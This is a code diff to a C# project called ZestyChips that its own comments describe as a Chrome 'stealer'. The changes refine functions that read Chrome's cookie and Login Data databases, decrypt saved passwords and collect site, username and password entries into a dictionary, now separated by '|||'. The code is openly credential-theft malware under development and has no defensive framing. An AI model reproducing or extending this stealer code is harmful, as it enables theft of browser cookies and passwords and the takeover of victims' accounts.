@@ -21,17 +21,17 @@ namespace ZestyChips
         public static void Start()
         {
             // steal chrome data
-            string chromeData = Chrome();
-            Helpers.PrintSuccess($"found chrome data: {chromeData}");
+            Chrome();
         }
 
         /*
         * stealer functions for Chrome
         */
-        private static string Chrome() {
+        private static void Chrome() {
             string cookies = StealChromeData("\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", "cc");
             string login = StealChromeData("\\Google\\Chrome\\User Data\\Default\\Login Data", "p");
-            return cookies;
+            // Helpers.PrintSuccess($"found chrome cookies: {cookies}");
+            // Helpers.PrintSuccess($"found chrome passwords: {login}");
         }
         
         /*
@@ -79,8 +79,10 @@ namespace ZestyChips
                 
             }
         }
-        // sqliteCommand = new SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", sqliteConnection);
-
+        
+        /*
+        * Decrypt password store, note passwords are separated from username with 3 pipes |||
+        */
         private static string DecryptChromePasswords(string dataSourceFile) {
             // open the Chrome cookies database
             SQLiteConnection sqliteConnection = new SQLiteConnection($"Data Source={dataSourceFile}");
@@ -125,17 +127,21 @@ namespace ZestyChips
                     string dict_site = obj2.ToString();
                     string dict_user = obj.ToString();
 
+                    if (dict_site == "") {
+                        dict_site = "Site URL not found"; // can't carve out some sites for some reason. E.g. reddit
+                    }
+
                     if (masterDictionary.ContainsKey(dict_site)) {
                         Dictionary<string, string> dictionary2 = masterDictionary;
                         dictionary2[dict_site] = string.Concat(new string[] {
                             dictionary2[dict_site],
                             (dict_user != null) ? dict_user.ToString() : null,
-                            "=",
+                            "|||",
                             decryptedPassword,
                             "; "
                         });
                     } else {
-                        masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "=" + decryptedPassword + "; ");
+                        masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "|||" + decryptedPassword + "; ");
                     }
 
 
@@ -159,12 +165,12 @@ namespace ZestyChips
                             dictionary2[dict_site] = string.Concat(new string[] {
                                 dictionary2[dict_site],
                                 (dict_user != null) ? dict_user.ToString() : null,
-                                "=",
+                                "|||",
                                 decryptedPassword,
                                 "; "
                             });
                         } else {
-                            masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "=" + decryptedPassword + "; ");
+                            masterDictionary.Add(dict_site, ((dict_user != null) ? dict_user : null) + "|||" + decryptedPassword + "; ");
                         }
                     } catch {
                         passwordResult = string.Concat(new string[]{
